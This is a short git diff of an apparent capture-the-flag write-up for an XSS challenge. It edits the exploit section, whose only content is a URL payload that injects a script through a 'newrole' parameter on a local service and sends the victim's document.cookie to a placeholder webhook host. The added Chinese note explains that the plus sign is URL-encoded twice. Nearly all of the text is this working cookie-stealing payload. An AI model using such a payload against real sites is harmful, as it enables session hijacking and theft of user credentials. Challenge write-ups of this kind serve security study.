@@ -31,5 +31,7 @@ XSS
 
 ## exp
 ```js
-url=http://127.0.0.1:9988/changerole?newrole=<script>location=`https://webhook/?f=`+encodeURIComponent(document.cookie)</script>
+url=http://localhost:9988/changerole?newrole=<script>location=`https://webhook/?f=`%252BencodeURIComponent(document.cookie)</script>
 ```
+
+注意这里加号进行了两次url编码
